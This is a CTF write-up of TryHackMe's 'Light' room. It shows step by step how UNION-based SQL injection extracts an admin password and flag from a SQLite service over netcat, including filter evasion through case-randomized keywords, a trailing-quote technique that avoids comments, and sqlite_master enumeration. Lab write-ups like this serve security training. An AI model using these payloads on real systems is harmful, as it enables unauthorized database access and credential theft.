<div align="center">

# 💡 LightRoom

*Blind-lookup to full dump: breaking a SQLite backend with UNION-based injection, one filtered keyword at a time.*

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red)
![Category](https://img.shields.io/badge/Category-SQL%20Injection%20%2F%20SQLite-blue)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![Flag](https://img.shields.io/badge/Flag-THM%7B...%7D-lightgrey)

</div>

---

## So what's this room about

Light drops you straight into a raw TCP service — no web app, no browser, just
`nc MACHINE_IP 1337`. The service calls itself a "database application" and asks
for a username before handing back a corresponding password. There's no real
authentication step — whatever you type into the username prompt gets dropped
straight into a backend SQL query, which makes it a clean, distraction-free
UNION-based SQL injection target.

Goal: find the admin username, recover their password, and grab the flag sitting
in the same table.

---

## What I used

- `nc` (netcat) — the only client this service needs
- Manual SQL injection payloads (no sqlmap — the room wants you to feel the query out by hand)
- SQLite-specific enumeration via `sqlite_master` (no `information_schema` here)
- Keyword case-randomization (`UnIoN SeLecT`) to slide past a naive, case-sensitive keyword filter
- `group_concat()` to pull an entire column in one shot

---

## How it went down

### 1. Connect and get a feel for the service

Connected with netcat and tried the username the room hands you. Entering `smokey`
immediately returned a password — confirming this isn't a login form, it's a
lookup: whatever username you give it, the backend runs something like
`SELECT password FROM users WHERE username='<input>' LIMIT 30` and prints the result.

```
$ nc 10.49.169.214 1337
Welcome to the Light database!
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
```

### 2. Confirm the injection point

Dropped in a single quote. The error echoed back the tail end of the real query
(`LIMIT 30`), confirming the username is concatenated straight into a SQL string
with no sanitization.

```
Please enter your username: '
Error: unrecognized token: "''' LIMIT 30"
```

### 3. Find — and route around — the filter

Tried a classic comment-based payload next. The service pushed back with a filter
message: it blocks any input containing `/*`, `--`, or `%0b`. No comment sequences
allowed, so the injected query has to close itself out cleanly with a trailing
quote instead of commenting out the rest of the line.

```
Please enter your username: ' uNion SeLeCt sqlite_version() '
Password: 3.31.1
```

That one payload did double duty: it got past the filter by trailing a closing
quote instead of a comment, and it got past keyword blacklisting by randomizing
the case of `UNION SELECT`. The returned version string (SQLite 3.31.1) also
confirmed the backend engine — no `information_schema`, so enumeration has to go
through `sqlite_master` instead.

### 4. Enumerate the tables

```
Please enter your username: ' UnIoN SeLecT tbl_name FRoM sqlite_master '
Password: admintable
```

### 5. Pull the admin username

```
Please enter your username: ' UnIon SelEcT uSeRName fRoM admintable '
Password: [REDACTED — answer to Q1]
```

A couple of follow-up attempts to filter by that username in a `WHERE` clause
tripped up on quoting (unquoted string literal) and a typo'd column name
(`Passowrd`), both useful confirmations that the query really is being parsed
as SQL rather than just string-matched.

### 6. Grab the password / flag

```
Please enter your username: ' UnIoN SeLEcT password From admintable '
Password: [REDACTED — flag]
```

### 7. Dump the whole column for good measure

To confirm there wasn't more sitting in that table, pulled every row's password
in one request with `group_concat()` instead of guessing row by row.

```
Please enter your username: ' UnION SeleCT group_concat(password) FroM admintable '
Password: [REDACTED],[REDACTED — flag]
```

---

## What I actually learned

- SQLite has no `information_schema` — `sqlite_master` (columns like `tbl_name`, `sql`) is the equivalent for enumerating tables and schema.
- A blacklist on `/*`, `--`, and `%0b` doesn't stop a UNION injection if the query has a fixed, predictable suffix (here, a trailing quote closed the string just as well as a comment would've).
- Case-randomizing keywords (`UnIoN`, `SeLEcT`) is a cheap, effective way around naive case-sensitive keyword filters.
- `group_concat()` turns a slow, one-row-at-a-time extraction into a single request — worth reaching for as soon as a UNION point is confirmed.
- Error messages are free recon: the very first syntax error leaked the trailing `LIMIT 30` clause of the real query.

---

## About the flag(s)

Per TryHackMe's rules, flags, passwords, and hashes recovered during this room are
not posted in plain text below — they're blacked out.

| Item | Value |
|---|---|
| Admin username | `████████████████` |
| Admin password / flag | `██████████████████████████████████` |
| Second user's password (from the `group_concat` dump) | `████████████████████` |

Flag format: `THM{...}`

---

<div align="center">

Writeup by **Simranjit Kaur** · Part of the [CTF Writeup Collection](../README.md)

</div>